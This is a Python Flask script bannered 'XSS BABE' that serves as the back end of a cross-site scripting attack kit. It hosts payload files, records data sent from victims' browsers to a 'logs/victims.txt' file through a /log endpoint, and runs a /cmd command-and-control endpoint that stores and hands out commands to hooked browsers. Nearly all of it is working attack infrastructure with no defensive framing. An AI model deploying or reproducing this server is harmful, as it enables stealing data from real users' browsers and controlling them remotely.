#!/usr/bin/env python3

print(r'''
XXXXXXX       XXXXXXX   SSSSSSSSSSSSSSS    SSSSSSSSSSSSSSS      BBBBBBBBBBBBBBBBB               AAA               BBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEE
X:::::X       X:::::X SS:::::::::::::::S SS:::::::::::::::S     B::::::::::::::::B             A:::A              B::::::::::::::::B  E::::::::::::::::::::E
X:::::X       X:::::XS:::::SSSSSS::::::SS:::::SSSSSS::::::S     B::::::BBBBBB:::::B           A:::::A             B::::::BBBBBB:::::B E::::::::::::::::::::E
X::::::X     X::::::XS:::::S     SSSSSSSS:::::S     SSSSSSS     BB:::::B     B:::::B         A:::::::A            BB:::::B     B:::::BEE::::::EEEEEEEEE::::E
XXX:::::X   X:::::XXXS:::::S            S:::::S                   B::::B     B:::::B        A:::::::::A             B::::B     B:::::B  E:::::E       EEEEEE
   X:::::X X:::::X   S:::::S            S:::::S                   B::::B     B:::::B       A:::::A:::::A            B::::B     B:::::B  E:::::E             
    X:::::X:::::X     S::::SSSS          S::::SSSS                B::::BBBBBB:::::B       A:::::A A:::::A           B::::BBBBBB:::::B   E::::::EEEEEEEEEE   
     X:::::::::X       SS::::::SSSSS      SS::::::SSSSS           B:::::::::::::BB       A:::::A   A:::::A          B:::::::::::::BB    E:::::::::::::::E   
     X:::::::::X         SSS::::::::SS      SSS::::::::SS         B::::BBBBBB:::::B     A:::::A     A:::::A         B::::BBBBBB:::::B   E:::::::::::::::E   
    X:::::X:::::X           SSSSSS::::S        SSSSSS::::S        B::::B     B:::::B   A:::::AAAAAAAAA:::::A        B::::B     B:::::B  E::::::EEEEEEEEEE   
   X:::::X X:::::X               S:::::S            S:::::S       B::::B     B:::::B  A:::::::::::::::::::::A       B::::B     B:::::B  E:::::E             
XXX:::::X   X:::::XXX            S:::::S            S:::::S       B::::B     B:::::B A:::::AAAAAAAAAAAAA:::::A      B::::B     B:::::B  E:::::E       EEEEEE
X::::::X     X::::::XSSSSSSS     S:::::SSSSSSSS     S:::::S     BB:::::BBBBBB::::::BA:::::A             A:::::A   BB:::::BBBBBB::::::BEE::::::EEEEEEEE:::::E
X:::::X       X:::::XS::::::SSSSSS:::::SS::::::SSSSSS:::::S     B:::::::::::::::::BA:::::A               A:::::A  B:::::::::::::::::B E::::::::::::::::::::E
X:::::X       X:::::XS:::::::::::::::SS S:::::::::::::::SS      B::::::::::::::::BA:::::A                 A:::::A B::::::::::::::::B  E::::::::::::::::::::E
XXXXXXX       XXXXXXX SSSSSSSSSSSSSSS    SSSSSSSSSSSSSSS        BBBBBBBBBBBBBBBBBAAAAAAA                   AAAAAAABBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEE
''')


from flask import Flask, request, render_template, send_from_directory, jsonify
import os
import datetime

app = Flask(__name__)
LOG_FILE = "logs/victims.txt"

# Ensure log directory exists
os.makedirs("logs", exist_ok=True)

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory('static', filename)

@app.route('/payloads/<path:filename>')
def serve_payloads(filename):
    return send_from_directory('payloads', filename)

@app.route('/log', methods=['GET', 'POST'])
def log_data():
    try:
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        if request.method == 'POST':
            data = request.get_json() or {}
            message = str(data)
        else:
            message = request.query_string.decode()
        with open(LOG_FILE, 'a') as f:
            f.write(f"{timestamp} {message}\n")
        return '', 204
    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/cmd', methods=['GET', 'POST'])
def command_control():
    if request.method == 'POST':
        with open("cmd.txt", "w") as f:
            f.write(request.data.decode())
        return "Command received", 200
    elif request.method == 'GET':
        if os.path.exists("cmd.txt"):
            with open("cmd.txt", "r") as f:
                return f.read(), 200
        return '', 204

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
